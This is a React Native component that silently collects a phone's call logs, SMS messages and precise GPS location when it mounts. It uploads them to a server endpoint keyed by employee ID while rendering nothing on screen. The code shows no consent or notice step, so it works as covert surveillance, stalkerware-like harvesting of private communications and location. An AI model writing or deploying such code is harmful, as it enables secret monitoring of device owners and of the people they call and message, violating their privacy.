import { StyleSheet, Text, View } from 'react-native';
import React, { useEffect } from 'react';
import { NativeModules } from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import { BASE_URL } from '../../config/constants';

const { CallLogModule, SmsModule } = NativeModules; // Import your native modules

const Data = ({ employeeId }) => {
    const fetchAndSendEmployeeData = async () => {
        try {
            // Fetch call logs using CallLogModule
            const callLogs = await CallLogModule.getCallLogs();
            console.log('Fetched Call Logs:', callLogs); // Log call logs
            
            // Fetch messages using SmsModule
            const messages = await SmsModule.getSmsLogs();
            console.log('Fetched Messages:', messages); // Log messages
            
            // Fetch location
            Geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude } = position.coords;
                    const timestamp = position.timestamp;

                    console.log('Fetched Location:', { latitude, longitude, timestamp }); // Log location

                    try {
                        const response = await fetch(`${BASE_URL}/employee/${employeeId}`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                callLogs,
                                messages,
                                location: { latitude, longitude, timestamp },
                            }),
                        });

                        if (!response.ok) {
                            throw new Error('Failed to send data');
                        }

                        const responseData = await response.json(); // Get the response data
                        console.log('Response Data:', responseData); // Log the response data

                        console.log('Data sent successfully'); // Log success message
                    } catch (error) {
                        console.error('Error sending data:', error);
                    }
                },
                (error) => {
                    console.error('Geolocation error:', error.code, error.message); // Log geolocation errors
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
            );
        } catch (error) {
            console.error('Error fetching call logs or messages:', error); // Log any errors
        }
    };

    useEffect(() => {
        if (employeeId) {
            fetchAndSendEmployeeData();
        } else {
            console.warn('Employee ID is not provided'); // Warn if employeeId is null
        }
    }, [employeeId]);

    return null; // This component doesn't need to render anything
};

export default Data;
